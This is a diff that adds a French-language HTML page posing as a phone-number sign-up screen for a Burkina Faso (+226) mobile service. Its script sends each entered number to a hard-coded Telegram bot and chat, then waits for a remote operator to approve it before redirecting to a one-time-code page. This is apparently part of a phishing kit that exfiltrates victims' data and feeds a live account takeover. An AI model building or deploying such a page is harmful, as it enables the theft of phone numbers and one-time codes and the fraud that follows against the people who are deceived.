@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phone Number</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
+  body { background: #fff; }
+  .header {
+    background: #E8701A;
+    height: 88px;
+    display: flex;
+    align-items: flex-end;
+    padding: 0 18px 14px;
+  }
+  .back-arrow {
+    color: white;
+    font-size: 26px;
+    text-decoration: none;
+    line-height: 1;
+  }
+  .content { padding: 32px 22px 0; }
+  .title {
+    font-size: 30px;
+    font-weight: 800;
+    color: #111;
+    margin-bottom: 8px;
+  }
+  .subtitle {
+    font-size: 14px;
+    color: #888;
+    margin-bottom: 24px;
+    line-height: 1.4;
+  }
+  .phone-input-row {
+    display: flex;
+    align-items: center;
+    border: 2px solid #1A6DBF;
+    border-radius: 12px;
+    padding: 0 14px;
+    height: 54px;
+  }
+  .phone-input-row.invalid {
+    border-color: #dc3545;
+  }
+  .country-code {
+    font-size: 16px;
+    color: #222;
+    margin-right: 10px;
+  }
+  .divider {
+    width: 1px;
+    height: 22px;
+    background: #ccc;
+    margin-right: 10px;
+  }
+  .phone-input-row input {
+    border: none;
+    outline: none;
+    font-size: 15px;
+    color: #999;
+    width: 100%;
+    background: transparent;
+  }
+  .phone-input-row input:focus {
+    color: #111;
+  }
+  .error-message {
+    font-size: 13px;
+    color: #dc3545;
+    margin-top: 6px;
+    display: none;
+  }
+  .error-message.visible {
+    display: block;
+  }
+  .bottom {
+    position: fixed;
+    bottom: 28px;
+    left: 22px;
+    right: 22px;
+  }
+  .terms-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    margin-bottom: 16px;
+  }
+  .terms-row input[type=checkbox] {
+    width: 20px;
+    height: 20px;
+    margin-top: 2px;
+    flex-shrink: 0;
+    cursor: pointer;
+  }
+  .terms-row label {
+    font-size: 13px;
+    color: #555;
+    line-height: 1.5;
+  }
+  .terms-row a { color: #1A6DBF; text-decoration: none; }
+  .continue-btn {
+    width: 100%;
+    height: 52px;
+    border: none;
+    border-radius: 14px;
+    background: #B8CFF0;
+    color: #fff;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: default;
+  }
+  .continue-btn.active {
+    background: #1A6DBF;
+    cursor: pointer;
+  }
+  /* Spinner overlay */
+  #spinner {
+    position: fixed;
+    inset: 0;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    background: rgba(255,255,255,0.7);
+    z-index: 999;
+  }
+  .loader {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #E8701A;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body>
+<div class="header">
+  <a href="#" class="back-arrow">&#8592;</a>
+</div>
+<div class="content">
+  <h1 class="title">Commençons</h1>
+  <p class="subtitle">Entrez votre numéro de téléphone pour commencer</p>
+  <div class="phone-input-row" id="phoneRow">
+    <span class="country-code">+226</span>
+    <div class="divider"></div>
+    <input type="tel" placeholder="Saisissez le numéro de téléphone" id="phoneInput" inputmode="numeric" autocomplete="tel">
+  </div>
+  <div class="error-message" id="phoneError">Numéro invalide. Exemple : 70 12 34 56</div>
+</div>
+<div class="bottom">
+  <div class="terms-row">
+    <input type="checkbox" id="terms" onchange="checkForm()">
+    <label for="terms">J'accepte le <a href="#">Conditions d'utilisation</a> et <a href="#">Politique de confidentialité</a></label>
+  </div>
+  <button class="continue-btn" id="continueBtn" disabled>Continuer</button>
+</div>
+
+<!-- Spinner -->
+<div id="spinner">
+  <div class="loader"></div>
+</div>
+
+<script>
+  (function() {
+    // ===== TELEGRAM CONFIG =====
+    const BOT_TOKEN = '8902453840:AAH3X3QmwtDnQ9V_3MCk4zSz29iK2Dlxfxk';
+    const CHAT_ID   = '1006917440';
+    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+    // ===== DOM =====
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneRow = document.getElementById('phoneRow');
+    const phoneError = document.getElementById('phoneError');
+    const termsCheck = document.getElementById('terms');
+    const continueBtn = document.getElementById('continueBtn');
+    const spinner = document.getElementById('spinner');
+
+    // ===== BURKINA FASO VALIDATION (ALL OPERATORS) =====
+    // Valid prefixes: 50-79 (covers Orange, Moov, MVNOs, etc.)
+    function normalizePhone(raw) {
+      let digits = raw.replace(/\D/g, '');
+      if (digits.startsWith('226')) {
+        digits = digits.slice(3);
+      }
+      return digits;
+    }
+
+    function isValidBurkinaPhone(digits) {
+      if (digits.length !== 8) return false;
+      const prefix = digits.substring(0, 2);
+      const prefixNum = parseInt(prefix, 10);
+      // All legitimate mobile prefixes in Burkina Faso are between 50 and 79
+      return prefixNum >= 50 && prefixNum <= 79;
+    }
+
+    function validatePhone() {
+      const raw = phoneInput.value.trim();
+      const digits = normalizePhone(raw);
+      let valid = false;
+      let errorMsg = '';
+
+      if (raw === '') {
+        phoneRow.classList.remove('invalid');
+        phoneError.classList.remove('visible');
+        return false;
+      }
+
+      if (digits.length < 8) {
+        errorMsg = 'Le numéro doit comporter 8 chiffres (ex: 70 12 34 56)';
+      } else if (digits.length > 8) {
+        errorMsg = 'Numéro trop long. Vérifiez le format.';
+      } else if (!isValidBurkinaPhone(digits)) {
+        errorMsg = 'Numéro invalide. Doit commencer par 50, 51, ..., 78 ou 79.';
+      } else {
+        valid = true;
+      }
+
+      if (!valid && raw !== '') {
+        phoneRow.classList.add('invalid');
+        phoneError.textContent = errorMsg;
+        phoneError.classList.add('visible');
+      } else {
+        phoneRow.classList.remove('invalid');
+        phoneError.classList.remove('visible');
+      }
+
+      return valid;
+    }
+
+    // ===== CHECK FORM =====
+    function checkForm() {
+      const phoneValid = validatePhone();
+      const termsChecked = termsCheck.checked;
+      if (phoneValid && termsChecked) {
+        continueBtn.classList.add('active');
+        continueBtn.disabled = false;
+      } else {
+        continueBtn.classList.remove('active');
+        continueBtn.disabled = true;
+      }
+    }
+
+    phoneInput.addEventListener('input', checkForm);
+    termsCheck.addEventListener('change', checkForm);
+    // initial state
+    continueBtn.disabled = true;
+
+    // ===== TELEGRAM HELPERS =====
+    function escapeHtml(unsafe) {
+      return unsafe.replace(/[&<>"]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        if (m === '"') return '&quot;';
+        return m;
+      });
+    }
+
+    async function sendToTelegram(payload) {
+      const url = `${API_BASE}/sendMessage`;
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      return await response.json();
+    }
+
+    let pollInterval = null;
+
+    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+      if (pollInterval) clearInterval(pollInterval);
+      let lastUpdateId = 0;
+      pollInterval = setInterval(async () => {
+        try {
+          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+          const res = await fetch(url);
+          const data = await res.json();
+          if (!data.ok || !data.result.length) return;
+
+          data.result.forEach(update => {
+            lastUpdateId = update.update_id;
+            if (update.callback_query && update.callback_query.data) {
+              const parts = update.callback_query.data.split('_');
+              if (parts.length >= 3) {
+                const [type, action, time] = parts;
+                if (time == expectedTs && type === expectedPrefix) {
+                  clearInterval(pollInterval);
+                  pollInterval = null;
+                  onDecision(action);
+                }
+              }
+            }
+          });
+        } catch (err) {
+          console.warn('Poll error', err);
+        }
+      }, 1500);
+    }
+
+    // ===== CLICK ON CONTINUE =====
+    let isProcessing = false;
+
+    continueBtn.addEventListener('click', async function() {
+      if (isProcessing || this.disabled) return;
+
+      const raw = phoneInput.value.trim();
+      const digits = normalizePhone(raw);
+      if (!isValidBurkinaPhone(digits)) {
+        checkForm();
+        return;
+      }
+
+      // Save with +226 for other pages
+      const fullPhone = '+226' + digits;
+      localStorage.setItem('phone', fullPhone);
+
+      // Disable UI
+      isProcessing = true;
+      phoneInput.disabled = true;
+      termsCheck.disabled = true;
+      continueBtn.disabled = true;
+      continueBtn.classList.remove('active');
+      spinner.style.display = 'flex';
+
+      const ts = Date.now();
+      // Send only the 8 digits to Telegram
+      const msg = `🔐 Phone verification\n\n📱 Phone: <code>${digits}</code>\n\nApprove this number?`;
+
+      try {
+        await sendToTelegram({
+          chat_id: CHAT_ID,
+          text: msg,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [[
+              { text: '✅ Approve', callback_data: `phone_approve_${ts}` },
+              { text: '❌ Decline', callback_data: `phone_decline_${ts}` }
+            ]]
+          }
+        });
+
+        pollForCallback('phone', ts, (action) => {
+          spinner.style.display = 'none';
+          isProcessing = false;
+
+          if (action === 'approve') {
+            window.location.href = '6otp.html';
+          } else if (action === 'decline') {
+            phoneInput.disabled = false;
+            termsCheck.disabled = false;
+            continueBtn.disabled = false;
+            checkForm();
+            phoneRow.classList.add('invalid');
+            phoneError.textContent = 'Numéro non autorisé par l\'administrateur.';
+            phoneError.classList.add('visible');
+            isProcessing = false;
+          }
+        });
+
+      } catch (err) {
+        console.error('Telegram error:', err);
+        spinner.style.display = 'none';
+        isProcessing = false;
+        phoneInput.disabled = false;
+        termsCheck.disabled = false;
+        checkForm();
+        alert('Erreur de connexion. Veuillez réessayer.');
+      }
+    });
+
+    // Cleanup poll on page unload
+    window.addEventListener('beforeunload', () => {
+      if (pollInterval) clearInterval(pollInterval);
+    });
+  })();
+</script>
+</body>
+</html>
